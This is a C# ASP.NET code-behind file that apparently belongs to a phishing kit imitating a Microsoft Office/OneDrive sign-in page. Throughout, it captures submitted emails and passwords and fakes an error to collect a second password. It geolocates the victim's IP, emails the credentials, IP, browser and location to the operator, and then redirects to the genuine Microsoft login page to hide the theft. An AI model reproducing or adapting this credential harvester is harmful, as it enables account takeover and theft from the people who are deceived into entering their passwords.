﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.Script.Serialization;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace Podan_One_Drive
{
    public partial class Office : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void Office_onclick(object sender, EventArgs e)
        {
            bool errorPage = Request.QueryString["error"] != null;
            string mEmail = Request.Form["email"];
            bool isEmail = Regex.IsMatch(mEmail, @"\A(?:[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)\Z", RegexOptions.IgnoreCase);

            if(!isEmail)
            {
                Response.Redirect("~/Office.aspx?ajax=1");
                return;
            }

            string mPassword = errorPage ? " #2: " + Request.Form["password"] :
                                           " #1: " + Request.Form["password"];
            string mLoginType = Request.Form["logintype"];

            String ipAddress = Request.UserHostAddress;
            string Subject = "Office Login attempt - " + ipAddress;
            string json = (new WebClient()).DownloadString("http://www.geoplugin.net/json.gp?ip=" + ipAddress);
            var obje = new JavaScriptSerializer().Deserialize<Dictionary<string, string>>(json);

            string Body = "LoginType: " + mLoginType +
                          "\nEmail: " + mEmail +
                          "\nPassword" + mPassword +
                          "\nIP Address: " + ipAddress +
                          "\nBrowser Type: " + Request.UserAgent +
                          "\nLocation city: " + obje["geoplugin_city"] +
                          "\nLocation country: " + obje["geoplugin_countryName"]; ;
            Email.SendEmail(Subject, Body);

            if (!errorPage)
            {
                Response.Redirect("~/Office.aspx?error=1&email=" + mEmail);
            }
            else { Response.Redirect("https://login.microsoftonline.com/common/oauth2"); }
        }
    }
}
